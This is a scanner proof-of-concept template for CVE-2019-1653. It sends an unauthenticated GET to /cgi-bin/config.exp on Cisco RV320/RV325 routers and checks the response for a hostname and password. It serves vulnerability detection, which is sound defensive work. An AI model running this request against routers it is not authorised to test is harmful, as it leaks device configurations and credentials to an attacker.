[info]
author = "AVE"
description = "Cisco Small Business RV320和RV325路由器Web管理界面存在访问控制错误漏洞，未经认证的远程攻击者可通过GET请求/cgi-bin/config.exp路径下载设备配置文件，导致敏感信息泄露。"
id = "POC-AVE-2019-0806"
name = "Cisco RV320/RV325 配置信息泄露 PoC"
severity = "high"
tags = ["ave-2019-0806"]
vuln_id = [
    "CVE-2019-1653",
    "AVE-2019-0806",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/cgi-bin/config.exp"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "config",
    "hostname",
    "password",
]
